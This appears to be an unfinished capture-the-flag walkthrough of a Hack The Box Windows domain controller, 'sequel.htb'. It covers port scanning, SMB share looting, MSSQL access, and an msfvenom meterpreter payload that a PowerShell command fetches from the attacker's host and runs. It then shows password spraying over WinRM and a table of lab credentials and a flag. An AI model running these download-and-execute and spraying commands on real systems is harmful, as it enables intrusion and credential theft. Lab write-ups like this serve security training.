# Intro

# Enumeration

## Nmap

Check all open ports
```bash
 nmap -sS -p- -vv -min-rate 10000 -oA ./nmap/massive_scan 10.129.232.128  
```

- **min-rate 10000**: means that we send 10000 packets for second 
- **-p-**: Scan all 65,535 ports
- **-sS**: **SYN** scan is a stealth scan that check if a TCP port is open sending a SYN packet. If the target respond with `SYN-ACK` the port is open instance if respond with `RST` is closed. This scan **doesn't** complete a TCP handshake this reduce the noise and logging, this allow us to hide from **IDS** or **firewall**

Extract all ports from `.gnamp` file using `grep` and save all in **$ports** variable
```bash
ports=$(grep "Ports:" nmap/massive_scan.gnmap | grep -oP '\d+(?=/open/tcp)' | paste -sd,)
```

now i perform a more deep scan only on open ports
```bash
sudo nmap -sS -sC -p $ports 10.129.232.128 -oA ./nmap/target_scan

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-07-21T13:52:30+00:00; +1d00h02m07s from scanner time.
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
1433/tcp  open  ms-sql-s
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-07-21T13:21:36
|_Not valid after:  2055-07-21T13:21:36
| ms-sql-info: 
|   10.129.232.128:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.232.128:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-07-21T13:52:30+00:00; +1d00h02m06s from scanner time.
3268/tcp  open  globalcatLDAP
5985/tcp  open  wsman
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49693/tcp open  unknown
49695/tcp open  unknown
49726/tcp open  unknown
49805/tcp open  unknown

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1d00h02m06s, deviation: 0s, median: 1d00h02m05s
| smb2-time: 
|   date: 2025-07-21T13:51:33
|_  start_date: N/A

```

We have found:
- **Microsoft SQL Server 2019 RTM** on port **1433** 
- The **SMB** share port on **445**
- The domain is **sequel.htb**  the computer name is **DC01** and the FQN is **DC01.sequel.htb**. I have added this information on my hotsts file 
## Enumerate SMB folders
The organization give use the rose's credentials. We can use that to enumerate the shares.

```bash
smbmap -H DC01.sequel.htb -u rose -p 'KxEPkKe6R8su'
```

![](../../../../Assest/Pasted%20image%2020250720160721.png)

The **Accounting Department** is a non standard folder so we can check what we have here. Connect to the SMB  share withe `smbclient`
```
smbclient "//DC01.sequel.htb/Accounting Department" -U rose --password 'KxEPkKe6R8su'
```

To download all content in the folder
```bash
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
![](../../../../Assest/Pasted%20image%2020250720161945.png)
We have two Excels (disgusting) files.
![](../../../../Assest/Pasted%20image%2020250721002832.png)
I try to open this to files but seams are corrupted. Indeed the magic bytes are not the corresponded bytes of xlsx.. i ha try to modify the uncorrected byte but still not worked. So i have decide to convert the Shitexl in to CSV file.

In the `Accounts` file we have different password
![](../../../../Assest/Pasted%20image%2020250721003252.png)


# Foothold

## MSSQL
With the previously founded credential we have access to MSSQL for `sa@sequel.htb`  user
![](../../../../Assest/Pasted%20image%2020250721004055.png)
- `local-auth`: This because the user is not in the domain. Is a local user of DC01 computer.

Now my idea is to craft a meterpreter shell using `msfvenom` and download in the target machine through power-shell command. First all i need to check the arch of the target. We can do with `systeminfo` command on windows.

![](../../../../Assest/Pasted%20image%2020250721004948.png)
- with the `-X` flag we can run PS code. 

Create a meterpreter shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=667 -f exe -o meterpreter.exe
```

Now setup the listener on `msfconsole` using `multi/handler` module.

```bash
netexec mssql DC01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X "powershell -c \"mkdir C:\\TEMP; Invoke-WebRequest -Uri http://10.10.14.85:8000/meterpreter.exe -OutFile C:\\TEMP\\ciccio.exe; Start-Process C:\\TEMP\\ciccio.exe\"" --verbose
```

![](../../../../Assest/Pasted%20image%2020250721011545.png)

!TODO: explain the powershell script

![](../../../../Assest/Pasted%20image%2020250721011531.png)

Now under the  `C:\SQL2019\ExpressAdv_ENU` installation folder of MSSQL we can see the `sql-Configuration.INI` file that contains `sql_svc` user's credentials.

![](../../../../Assest/Pasted%20image%2020250721012901.png)
!TODO: How to create a users list
!TODO: spray attack with founded password (i cant log in with `sql_svc` user)
![](../../../../Assest/Pasted%20image%2020250724205831.png)


As we see during the port scanning  the `5985` port is open. This port typically is used by the [`winrm` service](https://www.speedguide.net/port.php?port=5985).  we can try to brute force our users list with the password founded in the SQL config file
```bash
netexec winrm DC01.sequel.htb -u users -p 'WqSZAF6CysDQbGb3' -d sequel --continue-on-success --verbose
```
![](../../../../Assest/Pasted%20image%2020250724210228.png)
The `ryan` user has reused the  `WqSZAF6CysDQbGb3`. We can access through `evil-winrm` on the **DC01.sequel.htb** as `ryan` user an take the first flag under the desktop.

```bash
evil-winrm -i DC01.sequel.htb -u 'SEQUEL\ryan' -p 'WqSZAF6CysDQbGb3'
```
![](../../../../Assest/Pasted%20image%2020250724210452.png)

# Privilege Escalation

![](../../../../Assest/Pasted%20image%2020250724230053.png)


![](../../../../Assest/Pasted%20image%2020250724230456.png)


!TODO: Reset password; and check vulnerable template 
# Loot

## Credentials

| user           | pwd              |
| -------------- | ---------------- |
| rose           | KxEPkKe6R8su     |
| sa@sequel.htb  | MSSQLP@ssw0rd!   |
| SEQUEL\sql_svc | WqSZAF6CysDQbGb3 |
| SEQUEL\ryan    | WqSZAF6CysDQbGb3 |

## Flags

| name     | falg                             |
| -------- | -------------------------------- |
| user.txt | b3370e6499147f8772878b0bc36294c0 |
